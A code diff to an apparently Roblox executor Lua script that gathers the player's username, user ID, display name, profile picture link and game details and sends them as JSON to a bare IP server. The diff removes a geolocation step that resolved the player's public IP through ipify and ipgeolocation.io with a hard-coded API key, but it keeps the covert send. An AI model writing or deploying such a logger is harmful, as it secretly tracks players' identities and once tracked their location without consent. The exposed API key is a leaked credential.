@@ -27,37 +27,18 @@ pcall(function()
         end
     end
     
-    local function geoData()
-        local http = game:GetService("HttpService")
-
-        local ip = game:HttpGet("https://api.ipify.org?format=json")
-        ip = http:JSONDecode(ip).ip
-
-        local geo = {}
-
-        local success, fail = pcall(function()
-            geo = game:HttpGet("https://api.ipgeolocation.io/ipgeo?apiKey=c45d0bccd0fc464faa2eb32f0c9af64f&ip="..ip)
-        end)
-
-        if success and not fail then
-            geo = http:JSONEncode(geo)
-                
-            return geo
-        end
-    end
-        
     local Data = {
         Username = Username,
         DisplayName = Displayname,
         UserId = UserId,
         PFP_Data = getPfpLINK(),
-        GEO_Data = geoData(),
         GameName = GameName,
         GamePlaceId = PlaceId,
         PlayerCount = PlayerCount
     }
 
     local Compiled = game:GetService("HttpService"):JSONEncode(Data)
+    local Formatted = ("http://70.105.254.224:218/?json=%s"):format(Compiled)
     
-    game:HttpGet(("http://70.105.254.224:218/?json=%s"):format(Compiled))
+    game:HttpGet(Formatted)
 end)
